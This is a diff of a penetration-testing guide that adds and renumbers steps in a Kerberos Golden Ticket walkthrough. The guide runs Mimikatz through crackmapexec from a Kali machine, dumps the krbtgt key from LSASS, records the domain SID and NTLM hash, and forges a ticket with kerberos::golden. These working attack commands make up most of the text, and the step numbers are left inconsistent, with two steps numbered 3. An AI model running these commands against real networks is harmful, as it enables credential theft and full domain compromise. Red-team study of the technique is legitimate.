@@ -66,13 +66,19 @@ This tells us information about what kind of passwords the client's user account
 
 Method:
 
-1. We will use Mimikatz. We will obtain SeDebugPrivilege to be able to pretend like we're accessing LSASS for "debugging privileges" but we are actually accessing krbtgt's keys in the LSASS for this attack:
+1. We will use Mimikatz. Drop into Mimikatz like this from attacker machine:
+
+```shellscript
+root@kali:~# crackmapexec smb <target_ip> -u <username> -p <password> -M mimikatz
+```
+  
+3. We will obtain SeDebugPrivilege to be able to pretend like we're accessing LSASS for "debugging privileges" but we are actually accessing krbtgt's keys in the LSASS for this attack:
 
 ```
 mimikatz # privilege::debug
 ```
 
-2. Run this command to get LSASS to return the cryptographic keys for the krbtgt account:
+3. Run this command to get LSASS to return the cryptographic keys for the krbtgt account:
 
 ```
 mimikatz # lsadump::lsa /inject /name:krbtgt
@@ -86,7 +92,7 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 
 
 
-3. Note the Domain SID (we will need this to forge the TGT tickets for this attack). It will look something like this in the section giving Domain details:
+4. Note the Domain SID (we will need this to forge the TGT tickets for this attack). It will look something like this in the section giving Domain details:
 
 ```
 S-1-5-21-3623811015-3361044348-30300820-1105
@@ -98,8 +104,8 @@ S-1-5-21-3623811015-3361044348-30300820-1105
 
 
 
-4. Get the NTLM hash for the krbtgt account. Note it down as well.
-5. Run this command to execute the attack:
+5. Get the NTLM hash for the krbtgt account. Note it down as well.
+6. Run this command to execute the attack:
 
 ```
 mimikatz # kerberos::golden /User:FakeUser /domain:[Domain].local /sid:[Domain SID] /krbtgt:[NTLM Hash for krbtgt] /id:[RID of Admin account - 500] /ptt
